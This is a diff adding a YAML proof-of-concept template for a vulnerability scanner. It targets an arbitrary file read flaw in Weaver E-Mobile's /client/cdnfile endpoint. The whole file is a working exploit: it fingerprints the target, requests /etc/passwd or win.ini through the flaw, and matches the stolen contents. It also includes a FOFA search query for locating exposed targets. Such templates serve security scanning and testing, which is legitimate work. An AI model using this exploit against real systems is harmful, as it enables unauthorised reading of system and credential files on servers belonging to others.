@@ -1,0 +1,23 @@
+id: poc-yaml-weaver-emobile-cdnfile-fileread
+info:
+  name: 泛微E-Mobile client/cdnfile 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 泛微-EMobile
+  fofa: app="泛微-EMobile"
+variables:
+  r_data_linux: '1C/Windows/win.ini
+
+    C/etc/passwd'
+firstRequest:
+  method: GET
+  path: /
+  expression: "status_code == 200 && \ncontains(body,\"移动管理平台\")\n"
+requests:
+- method: GET
+  path: /client/cdnfile/{{.r_data_linux}}
+  expression: "status_code == 200 &&\n(\ncontains(body, \"bit app support\") && \n\
+    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nmatches(body,\
+    \ \"root:.*:0:0:\")\n)\n"
+transport: http
